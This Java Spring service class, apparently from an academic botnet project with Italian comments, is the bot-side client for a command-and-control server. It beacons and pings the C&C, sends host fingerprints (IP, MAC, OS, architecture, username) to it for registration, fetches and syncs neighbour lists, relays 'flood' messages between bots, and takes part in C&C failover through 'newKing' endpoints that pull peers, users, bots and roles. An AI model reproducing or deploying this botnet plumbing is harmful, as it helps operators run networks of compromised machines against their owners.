package cs.sii.network.request;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.security.InvalidKeyException;
import java.security.PublicKey;
import java.security.SignatureException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.Future;

import org.apache.http.Header;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.HttpClientBuilder;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.scheduling.annotation.AsyncResult;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.model.bot.Bot;
import cs.sii.model.role.Role;
import cs.sii.model.user.User;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.crypto.CryptoUtils;

@Service("BotRequest")
public class BotRequest {

	private static final int WAIT_RANGE = 1000;

	private static final String PORT = ":8443";

	private static final String HTTPS = "https://";
	private static final String HTTP = "http://";

	public final static Integer REQNUMBER = 10;

	private static final int TIMEOUT_MILLIS = 600000;

	@Autowired
	private RestTemplate restTemplate;

	private Integer timeoutSeconds;

	@Autowired
	private CryptoPKI pki;
	@Autowired
	private CryptoUtils cUtil;

	public BotRequest() {
	}

	public Boolean pingToCec(String ipCec) {
		Integer counter = 0;
		while (counter <= REQNUMBER) {
			try {
				String url = HTTPS + ipCec + PORT + "/bot/ping";
				System.out.println("Effettuo Ping al Cec " + ipCec);
				Boolean response = restTemplate.postForObject(url, null, Boolean.class);
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("CeC " + ipCec + " Morto a Causa: " + e.getMessage());
				counter++;
				// Aspetto prima della prossima richiesta
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					System.err.println("Errore sleep" + ex);
					ex.printStackTrace();
				}
			}
		}
		return false;
	}

	@Async
	public Future<Boolean> pingToBot(String ipBot) {
		Integer counter = 0;
		while (counter <= REQNUMBER) {
			try {
				String url = HTTPS + ipBot + PORT + "/bot/ping";
				System.out.println("Effettuo Ping a " + ipBot);
				Boolean response = restTemplate.postForObject(url, null, Boolean.class);
				return new AsyncResult<>(response);
			} catch (Exception e) {
				System.out.println("Bot " + ipBot + " Morto a Causa: " + e.getMessage());
				counter++;
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					System.err.println("Errore sleep" + ex);
					ex.printStackTrace();
				}
			}
		}
		return new AsyncResult<>(false);
	}

	@Async
	public Future<Pairs<IP, Integer>> esempioRichiesta(String uriMiner) {
		String result = "";
		Integer level = -1;
		Integer counter = 0;
		while (counter <= REQNUMBER) {
			try {
				System.out.println("\nRichiesta ad :" + uriMiner);
				result = restTemplate.getForObject("http://" + uriMiner + "/fil3chain/updateAtMaxLevel", result.getClass());
				level = Integer.decode(result);
				System.out.println("Chain Level" + level);
				return new AsyncResult<>(new Pairs<>(new IP(uriMiner), level));
			} catch (Exception e) {
				System.out.println("\nSono Morto: " + uriMiner + " Causa: " + e.getMessage());
				counter++;
			}
			try {
				Thread.sleep(WAIT_RANGE);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		return null;
	}

	/**
	 * @param iPCeC
	 * @param ipBot
	 * @param iDBot
	 */

	public ArrayList<Pairs<String, String>> askNeighbours(String iPCeC, String ipBot, String data) {
		ArrayList<Pairs<String, String>> result = new ArrayList<Pairs<String, String>>();
		Integer counter = 0;
		String encryptData = "";

		// richiesta del vicinato
		encryptData = pki.getCrypto().encryptAES(data);

		while (counter <= REQNUMBER) {
			try {
				String url = HTTPS + iPCeC + PORT + "/cec/neighbours";
				System.out.println("Richiesta Vicinato a " + url);
				byte[] buf;
				buf = restTemplate.postForObject(url, encryptData, byte[].class);
				ByteArrayInputStream rawData = new ByteArrayInputStream(buf);
				result = (ArrayList<Pairs<String, String>>) cUtil.decrypt(rawData);
				return result;
			} catch (Exception e) {
				counter++;
				System.out.println("errore richiesta vicinato");
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException e2) {
					e2.printStackTrace();
				}
			}

		}
		return null;
	}

	/**
	 * @param iPCeC
	 * @param ipBot
	 * @param iDBot
	 */

	public ArrayList<Pairs<String, String>> sendDeadNeighToCeC(String iPCeC, String myIdBot, List<IP> deadBotList) {
		ArrayList<Pairs<String, String>> result = new ArrayList<Pairs<String, String>>();
		Integer counter = 0;
		String encryptData = "";
		// richiesta del vicinato
		encryptData = pki.getCrypto().encryptAES(myIdBot);

		List<String> data = new ArrayList<String>();

		data.add(encryptData);
		for (IP obj : deadBotList) {
			data.add(obj.toString());
		}

		while (counter <= REQNUMBER) {
			try {
				String url = HTTPS + iPCeC + PORT + "/cec/neighbours/sync";
				System.out.println("Richiesta Vicinato a " + url);
				byte[] buf;
				buf = restTemplate.postForObject(url, data, byte[].class);
				ByteArrayInputStream rawData = new ByteArrayInputStream(buf);
				result = (ArrayList<Pairs<String, String>>) cUtil.decrypt(rawData);
				System.out.println("ritorna " + result);
				return result;
			} catch (Exception e) {
				counter++;
				System.out.println("errore richiesta vicinato");
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException e2) {
					e2.printStackTrace();
				}
			}

		}
		return null;
	}

	// da valutare se devono essere asincroni
	public Pairs<String, String> getIpCeCFromDnsServer(String dnsUrl) {
		Pairs<String, String> cec = new Pairs<String, String>();
		while (true) {
			try {

				System.out.println("url request " + dnsUrl);
				cec = restTemplate.postForObject(dnsUrl, null, cec.getClass());
				return cec;
			} catch (Exception e) {
				System.err.println("Errore ricezione Ip da Mock Dns Server" + e);
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					System.err.println("Errore sleep" + e);
					ex.printStackTrace();
				}
			}
		}
	}

	@Async
	public Boolean sendFloodToOtherBot(IP ipBot, String msg) {
		Boolean response = false;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + ipBot.getIp() + PORT + "/bot/flood";
				System.out.println("url bot flood" + url);
				response = restTemplate.postForObject(url, msg, response.getClass());
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("Errore invio richiesta flood");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}

	// da valutare se devono essere asincroni
	public Pairs<Long, Integer> getChallengeFromCeC(String idBot, IP ipCeC) {
		Pairs<Long, Integer> response = new Pairs<>();
		Integer counter = 0;

		String signId = null;
		String data = null;
		try {
			signId = pki.signMessageRSA(idBot);
			data = idBot + "<CS>" + signId;
		} catch (InvalidKeyException | SignatureException e1) {
			e1.printStackTrace();
		}

		while (counter < REQNUMBER) {
			try {
				String url = HTTPS + ipCeC + PORT + "/cec/welcome";
				System.out.println("url challenge request " + url);
				response = restTemplate.postForObject(url, data, response.getClass());
				return response;
			} catch (Exception e) {
				counter++;
				System.out.println("Errore ricezione Challenge");
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}

	// da valutare se devono essere asincroni
	@Async
	public Future<Pairs<Long, Integer>> getChallengeFromBot(String idBot, IP ipBotDest) {

		Pairs<Long, Integer> response = new Pairs<>();
		Integer counter = 0;
		while (counter < REQNUMBER) {
			try {
				String url = HTTPS + ipBotDest + PORT + "/bot/myneighbours/welcome";
				System.out.println("url challenge request " + url);
				response = restTemplate.postForObject(url, idBot, response.getClass());
				return new AsyncResult<Pairs<Long, Integer>>(response);
			} catch (Exception e) {
				counter++;
				System.out.println("Errore ricezione Challenge");
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return null;
	}

	/**
	 * @param ip
	 * @return
	 */
	public List<String> getPeers(String ip, String idBot) {
		List<String> response = null;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + ip + PORT + "/cec/newKing/peers";
				response = Arrays.asList(restTemplate.postForObject(url, idBot, String[].class));
				System.out.println("request new king peers ");
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("Errore richiesta new king peers");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}

	/**
	 * @param ip
	 * @return
	 */
	public List<User> getUser(String ip, String idBot) {
		List<User> response = null;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + ip + PORT + "/cec/newKing/users";
				response = Arrays.asList(restTemplate.postForObject(url, idBot, User[].class));
				System.out.println("request new king users ");
				return response;
			} catch (Exception e) {
				System.out.println("Errore richiesta new king users");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}

	//
	/**
	 * @param ip
	 * @return
	 */
	public List<Bot> getBots(String ip, String idBot) {
		List<Bot> response = null;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + ip + PORT + "/cec/newKing/bots";
				Bot[] bots = restTemplate.postForObject(url, idBot, Bot[].class);
				System.out.println("request new king  bots");
				for (int i = 0; i < bots.length; i++) {
					System.out.println("bot " + bots[i].toString());
				}
				response = Arrays.asList(bots);
				response.forEach(b -> System.out.println("bot list" + b.toString()));
				return response;
			} catch (Exception e) {
				e.printStackTrace();
				System.out.println("Errore richiesta new king bots");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}

	/**
	 * @param ip
	 * @return
	 */
	public List<Role> getRoles(String ip, String idBot) {
		List<Role> response = null;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + ip + PORT + "/cec/newKing/roles";
				response = Arrays.asList(restTemplate.postForObject(url, idBot, Role[].class));
				System.out.println("request new king roles ");
				return response;
			} catch (Exception e) {
				System.out.println("Errore richiesta new king roles");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}

	/**
	 * @param ip
	 * @return
	 */
	public boolean ready(String ip, String idBot) {
		boolean response = false;
		Integer count = 0;
		while (count < REQNUMBER) {
			try {
				String url = HTTPS + ip + PORT + "/cec/newKing/ready";
				response = restTemplate.postForObject(url, idBot, boolean.class);
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("Errore richiesta conferma al vecchio C&C");
				try {
					count++;
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}

	/**
	 * @param idBot
	 *            botdata
	 * @param ip
	 *            botdata
	 * @param Mac
	 *            botdata
	 * @param os
	 *            botdata
	 * @param vers
	 *            botdata
	 * @param arch
	 *            botdata
	 * @param usrName
	 *            botdata
	 * @param dest
	 *            destinatio ip of request
	 * @param hashMac
	 *            mac to be verified
	 * @param elegible
	 * @return
	 */
	public String getResponseFromCeC(String idBot, IP ip, String Mac, String os, String vers, String arch, String usrName, IP dest, String hashMac, PublicKey pk, boolean elegible) {
		Integer counter = 0;
		String response = "";
		while (counter <= REQNUMBER) {
			try {

				List<Object> objects = new ArrayList<Object>();
				objects.add(idBot);
				objects.add(ip.toString());
				objects.add(Mac);
				objects.add(os);
				objects.add(vers);
				objects.add(arch);
				objects.add(usrName);
				objects.add(hashMac);
				objects.add(pki.demolishPuK(pk));
				objects.add(elegible);
				response = restTemplate.postForObject(HTTPS + dest + PORT + "/cec/hmac", objects, String.class);
				return response;
			} catch (Exception e) {
				System.out.println("response:   " + response);
				System.out.println("Errore risoluzione Hmac con CeC");
				counter++;
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}

	/**
	 * @param ip
	 * @param dest
	 * @param hashMac
	 * @param pk
	 * @return
	 * @return
	 */

	public Boolean getResponseFromBot(String idBot, IP dest, String hashMac, PublicKey pk) {
		Integer counter = 0;
		Boolean response = false;
		while (counter < REQNUMBER) {
			try {
				List<String> objects = new ArrayList<String>();
				objects.add(idBot.toString());
				objects.add(hashMac);
				objects.add(pki.demolishPuK(pk));
				response = restTemplate.postForObject(HTTPS + dest + PORT + "/bot/myneighbours/hmac", objects, Boolean.class);
				System.out.println("Risposta richiesta " + response);
				return response;
			} catch (Exception e) {
				System.out.println("response:   " + response);
				System.out.println("Errore risoluzione Hmac con CeC");
				counter++;
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
		return response;
	}

	public String resolveDns(String dnsUrl) {
		String url = "http://" + dnsUrl;
		System.out.println("Risolvo dns: " + url);
		String rediret = null;

		HttpURLConnection connection = null;
		try {

			URL uri;
			uri = new URL(url);
			connection = (HttpURLConnection) uri.openConnection();
			connection.setInstanceFollowRedirects(false);
			rediret = connection.getHeaderField("Location");
		} catch (IOException e) {
			e.printStackTrace();
		}
		return rediret;
	}

	public String askMyIpToAmazon() {
		String amazing = "http://checkip.amazonaws.com/";
		String response = "";
		while (true) {
			try {
				response = restTemplate.getForObject(amazing, response.getClass());
				return response;
			} catch (Exception e) {
				System.out.println("no internet");
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
				e.printStackTrace();
			}
		}
	}

	public int getTimeoutSeconds() {
		return timeoutSeconds;
	}

	public void setTimeoutSeconds(int timeoutSeconds) {

		this.timeoutSeconds = timeoutSeconds;
	}

}
